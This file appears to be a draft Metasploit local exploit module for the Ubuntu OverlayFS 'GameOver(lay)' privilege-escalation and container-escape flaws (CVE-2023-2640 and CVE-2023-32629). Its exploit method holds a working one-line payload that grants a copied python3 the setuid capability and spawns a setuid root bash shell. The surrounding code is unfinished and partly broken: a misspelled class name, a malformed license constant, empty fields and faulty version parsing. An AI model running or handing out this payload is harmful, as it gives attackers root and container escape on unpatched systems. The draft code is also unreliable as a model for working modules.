class MetasplotModule < Msf::Exploit::Local

  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GameOver(lay) Privilege Escalation and Container Escape',
        'Description' => %q{},
        'License' => MSF__LICENSE,
        'Author' => [
          'g1vi', # PoC
          'h00die', # Module Suggestion
          'gardnerapp', # MsF Module
        ],
        'Platform' => ['linux'],
        'Arch' => [],
        'SessionTypes' => ['shell', 'meterpreter'],
        'DisclosureDate' => '2023-07-26',
        'References' => [
          'https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/',
          'https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629',
          'https://www.cvedetails.com/cve/CVE-2023-2640/',
          'https://www.cvedetails.com/cve/CVE-2023-32629/',
          'https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability'
        ]
      )
    )

    register_options(
      [
        
      ]
    )
  end

  def vuln
    # Keys are ubuntu versions, vals is list of vunerable kernels
    {
        "Lunar Lobster": %w[6.2.0], # Ubuntu 23.04
        "Kinetic Kudu": %w[5.19.0], # Ubuntu 22.10
        "Jammy Jellyfish": %w[5.19.0 6.2.0], # Ubuntu 22.04 LTS
        "Focal Fossa": %w[5.4.0], # Ubuntu 20.04 LTS 
        "Bionic Beaver": %w[5.4.0], # Ubuntu 18.04 LTS      
    }
  end 

  # Goal, dynamic checking of vunerable Ubuntu and kernel versions

  def check
    fail_with(Failure::NotVulnerable, 'Target is not linux') unless session.platform == 'linux'

    # Must be Ubuntu 
    fail_with(Failure::NotVulnerable, "Target is not Ubuntu.") unless version =~ /[uU]buntu/ 

    os = cmd_exec "cat /etc/os-release"

    # grab codename i.e. Focal Fossa
    release = os.scan  /\(\w* \w*\)/ 
   
    # Remove '(' and ')'
    release.delete_prefix!('(').delete_suffix!(')')

    print_status "Detected Ubuntu version: #{release}"

    # uname -r
    # yields something like 5.4.0-1018-blah
    kernel = kernel_release
    print_status "Detected kernel version: #{kernel}"

    # Make sure release is running vunerable kernel
    # will this return in correct context??
    # could scan kernel to prevent looping if return below doesn't work
    vuln[release].each do |version|
        if kernel.include? version  
            return CheckCode::Vulnerable "#{release} with #{kernel} is vunerable"
        end 
    end
    
  end

  def exploit
    check

    # g1vi made an exploit that works for both CVE-2023-2640 and CVE-2023-32629
    cmd_exec "unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;\" && u/python3 -c 'import os;os.setuid(0);os.system(\"cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash\")'"
    
  end

end
